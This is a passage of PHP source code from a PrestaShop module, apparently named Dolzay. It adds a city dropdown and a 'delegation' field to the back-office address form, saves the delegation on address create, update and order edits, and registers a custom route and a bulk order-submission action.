            $this->context->controller->addJS($this->_path . 'views/js/icons/font_awesome.js');
            // add the js and the css of the order submit process
            $this->context->controller->addCSS($this->_path . 'views/css/order_submit_process.css');
            $this->context->controller->addJS($this->_path . 'views/js/order_submit_process.js');
                
        }
    }


    public function hookActionCustomerAddressFormBuilderModifier($params){
        // located in prestashop\src\Core\Form\IdentifiableObject\Builder\FormBuilder.php at line : 138
        // the goal : is to convert the city filed into a select and to add the delegation field , also to 
        //            the options for both fields based on the db ($params['data']) or the request ($params['request']) in case of an invalide request in the 
        //            address form of the back-office

        $formBuilder = $params['form_builder'] ;
        $data = $params['data'] ;
        $request = $params['request'] ;
        $is_it_an_edit_form = isset($params['id']) ;
        
        $is_it_a_submit =  isset($request->request->all()['customer_address']) ;

        $existing_fields = $formBuilder->all() ;

        // remove all of the existing fields
        foreach ($existing_fields as $field_name => $field) {
            $formBuilder->remove($field_name) ;
        }

        // get the value of the city from the request if it's a submit request otherwise get it from db
        //$city_value = $is_it_a_submit ? $request->request->all()['customer_address']['city'] : $is_it_an_edit_form ? $data['city'] : null ;

        if ($is_it_a_submit) {
            $city_value = $request->request->all()['customer_address']['city'];
        } elseif ($is_it_an_edit_form) {
            $city_value = $data['city'];
        } else {
            $city_value = null;
        }

        // get the value of the delegation from the db if it's a rendering edit form request (not a submit request) to set it later in the form
        // because the value of the delegation doesn't show up in the form
        //$delegation_value = $is_it_an_edit_form && !$is_it_a_submit ? (new Address($params['id']))->delegation : null ;
        
        if ($is_it_a_submit) {
            $delegation_value = $request->request->all()['customer_address']['delegation'];
        } elseif ($is_it_an_edit_form) {
            $delegation_value = (new Address($params['id']))->delegation;
        } else {
            $delegation_value = null;
        }

        // prepare the delgation options based on the city value and the type of the form (edit or create)
        $delegation_options = isset(self::CITIES_DELEGATIONS[$city_value]) ? self::CITIES_DELEGATIONS[$city_value] : [] ;

        // add the fields in the right order
        foreach ($existing_fields as $field_name => $field) {
            // add the city and delegation
            if ($field_name === 'city') {
                $formBuilder->add('city', ChoiceType::class, [
                    'label' => 'Ville',
                    'required' => true,
                    'choices' => $is_it_an_edit_form && !isset(self::CITIES[$city_value]) ? array_merge([$city_value." (invalide)"=>$city_value],self::CITIES) : self::CITIES,
                    'placeholder' => 'Veuillez choisir une ville',
                    'constraints' => [
                        new NotBlank([
                            'message' => 'Ce champ est requis.'
                        ]),
                        new Choice([
                            'choices' => self::CITIES,
                            'message' => "La ville choisie n'est pas valide."
                        
                        ])
                    ]
                ]) 
                ->add('delegation', ChoiceType::class, [
                    'label' => 'Délégation',
                    'choices'  => $delegation_options,
                    'required' => true,
                    'placeholder' => 'Veuillez choisir une délégation',
                    'data' => $delegation_value, // set the value of the delegation in the rendering edit form request only 
                    'constraints' => [
                        new NotBlank([
                            'message' => 'Ce champ est requis.'
                        ]),
                        new Choice([
                            'choices' => $delegation_options,
                            'message' => "La délégation choisie n'est pas valide."
                        ])
                    ]
                ]) ;
            } else if($field_name == "phone"){
                $formBuilder->add('phone', TextType::class, [
                    'label' => 'Téléphone',
                    'required' => true,
                    'constraints' => [
                        new NotBlank([
                            'message' => 'Ce champ est requis.'
                        ]),
                        new Regex([
                            'pattern' => '/^[0-9]{8}$/',
                            'message' => 'Le numéro de téléphone doit contenir exactement 8 chiffres.'
                        ])
                    ]
                ]) ;
            }else{
                $formBuilder->add($field) ;
            }


        }

    }

    public function hookActionObjectAddressAddBefore($params)
    {
        // location prestashop\classes\ObjectModel.php at line  : 727
        // the goal : persisting the delegation in the db when adding a new address with the address form of the back-office
        $address = $params['object'];
        if (isset($_POST['customer_address']['delegation'])) {
            $address->delegation = Tools::getValue('customer_address')['delegation'];
        }
    }

    public function hookActionObjectAddressUpdateBefore($params)
    {
        // location prestashop\classes\ObjectModel.php at line  : 557
        // the goal : persisting the delegation in the db when updating an address with the address form of the back-office
        $address = $params['object'];
        if (isset($_POST['customer_address']['delegation'])) {
            $delegation = Tools::getValue('customer_address')['delegation'] ;
            $address->delegation = Tools::getValue('customer_address')['delegation'];
        }
    }

    public function hookActionAfterUpdateCustomerAddressFormHandler($params){
        // location C:\xampp\htdocs\prestashop\src\Core\Form\IdentifiableObject\Handler\FormHandler.php
        // the goal : because when i edit the address in the order detail page of the back-office a new address gets created
        //            without the delegation (for reason i didn't know) and it gets assigned as the delivery address of a the order i have to use this hook 
        //            to set the delegation for this new address )

        // check if the route is admin_order_addresses_edit
        if (isset($params['route']) && $params['route'] === "admin_order_addresses_edit") {
            
            $order  = new Order($params['id']) ;

            if (strpos($_SERVER['REQUEST_URI'], 'invoice') !== false) {
                // "invoice" exists in the pathname
                PrestaShopLogger::addLog("Invoice found in the request URI", 1, null, 'Dolzay');
            }
            
            $address = new Address(strpos($_SERVER['REQUEST_URI'], 'invoice') ? $order->id_address_invoice : $order->id_address_delivery) ;

            if ($address->delegation != $params['form_data']['delegation']) {
                $address->delegation = $params['form_data']['delegation'] ;
                $address->save() ;
            }

        }


    }

     public function hookModuleRoutes($params)
    {
        return [
            'module-dolzay-happycustomer' => [ // Unique route name
                'controller' => 'HappyCustomer', // Matches the controller class
                'rule' => 'dolzay', // Custom URL path
                'keywords' => [], // No parameters needed
                'params' => [
                    'fc' => 'module',
                    'module' => 'dolzay'
                ]
            ]
        ];
    }

    public function hookActionAdminOrdersListingFieldsModifier($params)
    {
        // Add a custom group action
        $params['actions'][] = [
            'title' => 'Soumettre les commandes',
            'class' => 'btn btn-default',
        ];
    }
}
